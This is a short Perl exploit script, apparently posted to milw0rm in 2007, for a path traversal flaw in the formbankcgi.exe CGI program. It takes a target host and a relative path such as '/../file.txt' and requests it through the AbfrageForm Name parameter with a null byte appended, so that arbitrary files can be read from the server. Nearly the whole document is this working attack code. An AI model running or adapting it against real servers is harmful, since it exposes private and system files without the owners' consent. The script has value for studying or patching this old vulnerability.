#!perl
#found by Bl0od3r
#visit http://dc3.dl.am  
#download:http://www.download-tipp.de/cgi-bin/jump.cgi?ID=8796
#developer:http://www.fersch.de/formbankserver/
use LWP::Simple;
sub usage
{
die("file.pl host.com /../file.txt");
}
$host= $ARGV[0];
$file= $ARGV[1];
if (!$host) {
die("No Host.");
} ; if (!$file) {
die("No File.");
}
getprint "http://".$host ."/cgi-bin/formbankcgi.exe/AbfrageForm?Name=".$ARGV[1]."%00";

# milw0rm.com [2007-01-01]
